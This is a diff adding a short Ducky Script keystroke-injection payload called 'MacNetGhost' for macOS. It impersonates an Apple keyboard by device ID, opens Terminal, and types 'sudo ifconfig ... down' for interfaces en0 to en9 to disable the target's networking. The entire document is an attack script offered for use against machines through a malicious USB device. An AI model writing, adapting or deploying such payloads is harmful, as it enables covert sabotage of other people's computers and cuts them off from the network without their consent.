@@ -1,0 +1,51 @@
+REM Ducky Script for Network Obscurity and Disabling Interfaces
+
+REM Author: Narsty
+REM Title: MacNetGhost
+REM Target: MacOS 
+REM Version: 1.0
+REM Category: Obscurity
+
+
+ID 05ac:021e Apple:Keyboard
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 500
+ENTER
+DELAY 1000
+STRING sudo ifconfig en0 down
+ENTER
+DELAY 7000
+STRING sudo ifconfig en1 down
+ENTER
+DELAY 500
+STRING sudo ifconfig en2 down
+ENTER
+DELAY 500
+STRING sudo ifconfig en3 down
+ENTER
+DELAY 500
+STRING sudo ifconfig en4 down
+ENTER
+DELAY 500
+STRING sudo ifconfig en5 down
+ENTER
+DELAY 500
+STRING sudo ifconfig en6 down
+ENTER
+DELAY 500
+STRING sudo ifconfig en7 down
+ENTER
+DELAY 500
+STRING sudo ifconfig en8 down
+ENTER
+DELAY 500
+STRING sudo ifconfig en9 down
+ENTER
+DELAY 1000
+STRING exit
+ENTER
+
+
